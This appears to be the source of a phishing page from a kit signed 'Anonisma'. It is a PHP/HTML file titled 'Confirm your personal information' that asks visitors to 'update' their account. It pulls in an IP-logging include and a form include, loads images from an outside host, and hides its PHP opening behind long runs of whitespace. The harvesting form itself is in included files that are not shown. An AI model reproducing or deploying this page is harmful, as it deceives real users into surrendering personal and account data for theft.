																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							

<?php
if (!isset($_SESSION)) {
  session_start();
}

include      "ip.php";         
    


?>																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								<!--


   ______              __             __                  ____                            ___                            _                             
  / ____/  ____   ____/ /  ___   ____/ /                 / __ )   __  __                 /   |   ____   ____    ____    (_)   _____   ____ ___   ____ _
 / /      / __ \ / __  /  / _ \ / __  /                 / __  |  / / / /                / /| |  / __ \ / __ \  / __ \  / /   / ___/  / __ `__ \ / __ `/
/ /___   / /_/ // /_/ /  /  __// /_/ /                 / /_/ /  / /_/ /                / ___ | / / / // /_/ / / / / / / /   (__  )  / / / / / // /_/ / 
\____/   \____/ \__,_/   \___/ \__,_/                 /_____/   \__, /                /_/  |_|/_/ /_/ \____/ /_/ /_/ /_/   /____/  /_/ /_/ /_/ \__,_/  
  																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								-->





<!DOCTYPE html>

<html>








   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <meta charset="utf-8">
      <link rel="stylesheet" href="./AA-NN-OO-NN-II-SS-MM-AA/main2.css">
	  <script src="./AA-NN-OO-NN-II-SS-MM-AA/anonis.js" type="text/javascript" charset="utf-8"></script>
	  <script src="./AA-NN-OO-NN-II-SS-MM-AA/Anoonisma.js" type="text/javascript" charset="utf-8"></script>
	  <script src="./AA-NN-OO-NN-II-SS-MM-AA/Anonisma-input.js" type="text/javascript" charset="utf-8"></script>
	  <script src="./AA-NN-OO-NN-II-SS-MM-AA/main2.js" type="text/javascript" charset="utf-8"></script>

      <title>Confirm your personal information</title>
  
	  <link rel="icon" type="image/x-icon" href="http://niceshopweb.com/7+/An-on-is-ma/hooool.ico">
      <style type="text/css"></style>
	  
	  <script language=Javascript>

      function onlyNumbersDano(evt)
      {
        var keyPressed = (evt.which) ? evt.which : event.keyCode
        return !(keyPressed > 31 && (keyPressed < 48 || keyPressed > 57));
      }
   
   </script>
	  
   </head>
   
   
   
   
   
   
   
   <body>

   
   <? include ("./head/menu.php"); ?>
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	          <div class="con-ismas contisma" id="contisma" role="main" >
            <div id="Anonismaaaaaaaaaaaaaaaaaaaaaaaa" class="maincontisma sumisma">
                <h1 id="heading1" class="ismad">Anonisma: Opciones</h1>
                <div class="Anonismaaaaaaaaaaaaaaaaaaaaaaaa">
                    <div class="Anoniiiiismaaaaaaa">
                        <div class="Anoniiiiismaaaaa">
                            <div class="inismaaaaaaaaaaaa">
                                <div class="fotoanonismaaaaa fotoanonismaaaaaaaaaaaa">
								
								<img WIDTH=85 HEIGHT=85  src="http://niceshopweb.com/7+/An-on-is-ma/wa7dd.png" >  
								
								
								</div>
                            </div>
                            <div class="mgharbaaaaaaaaaaaa">
                                <div class="name"><span class="maghrib-zwin">Hello! Please Update Your Account ! </span>
                                    <a class="edit hover" href="address.php" name="editName" role="button">Edit</a>
                                </div>
                                <p class="since sa7raa-maghriibiya">We are trying to recover your information &nbsp; &nbsp; &nbsp; <img  src="http://niceshopweb.com/22/fot/tikchbila.gif" ></a> </p>
                            </div>
                        </div>
                    </div>
                    <? include ("./head/barra-1.php"); ?>
					</div>
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  
	  

      <div class="mahdi_1"></div>
         <div class="mahdi_5">
            <hr align="center" noshade="noshade" size="1" color="#C1C1C1" width="100%">
            <div style="color:#1994FF;"  >    
			
			</br>
		                     
								</div>
			
            <hr align="center" noshade="noshade" size="1" color="#C1C1C1" width="100%">
      
   
   
   
   
   
   <? include ("./form/formulario-1.php"); ?>
   
   

			   
            
			   <table class="Anoniisma-a">
			   <tr>
			   <td>
               <div><img class="Anonismaa" align=" center" src="http://niceshopweb.com/22/fot/f.png"></div>
               <br>
               <div><img class="Anonismaa"  align=" center" src="http://niceshopweb.com/22/fot/ff.png"></div>
               <br>
               <div><img class="Anonismaa"  align=" center" src="http://niceshopweb.com/22/fot/fff.png"></div>
			   <br>
               <div><img class="Anonismaa"  align=" center" src="http://niceshopweb.com/22/fot/ffff.png"></div>
			   </BR>
               </td>
			   </tr>
			   </table>
		   
         </div>
      </div>
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   
   <? include ("./head/footer.php"); ?>
   
   
   
   
   
   
   
   


	


   </body>
</html>